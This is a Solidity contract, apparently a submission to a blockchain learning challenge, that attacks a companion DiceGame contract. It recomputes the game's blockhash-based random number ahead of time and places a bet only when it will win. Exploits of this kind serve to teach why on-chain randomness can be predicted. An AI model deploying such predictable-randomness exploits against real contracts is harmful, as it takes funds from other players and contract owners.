pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) onlyOwner public {
        uint256 withdrawAmount = address(this).balance;
        require(withdrawAmount > 0, "No amount to withdraw");
        (bool sent,) = _addr.call{value: _amount}("");
        require(sent, "Failed to withdraw");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public payable {
        require(address(this).balance >= .002 ether, "Failed to send enough value");
        bytes32 prevHash = blockhash(block.number - 1);
        uint256 newNonce = diceGame.nonce();
        bytes32 hash = keccak256(abi.encodePacked(prevHash, diceGame, newNonce));
        uint256 roll = uint256(hash) % 16;

        if (roll > 2) {
            return;
        } else {
            diceGame.rollTheDice{value: .002 ether}();
        }     
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {}
}
